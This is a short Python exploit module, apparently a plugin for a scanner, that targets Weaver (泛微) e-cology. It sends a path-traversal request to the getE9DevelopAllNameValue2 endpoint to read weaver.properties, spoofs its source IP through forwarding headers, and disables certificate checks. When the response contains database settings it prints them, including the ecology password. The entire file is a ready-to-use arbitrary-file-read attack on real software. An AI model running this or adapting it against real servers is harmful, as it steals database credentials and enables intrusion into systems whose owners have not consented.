import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {"X-Forwarded-For": "127.0.0.1",
                   "X-Originating": "127.0.0.1",
                   "X-Remote-IP": "127.0.0.1",
                   "X-Remote-Addr": "127.0.0.1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                   }
        path = 'api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties'
        logging.captureWarnings(True)
        aa1 = requests.get(url1 + path, cookies=s_cookie,headers=headers,proxies=proxies, verify=False, timeout=5)
        if aa1.status_code == 200 and 'ecology.password' in aa1.text and 'ecology.charset' in aa1.text and 'ecology.maxidletime' in aa1.text:
            cdd='[+]漏洞存在\n'+str(aa1.text)
        else:
            cdd='[-]漏洞不存在\n'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 任意文件读取 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)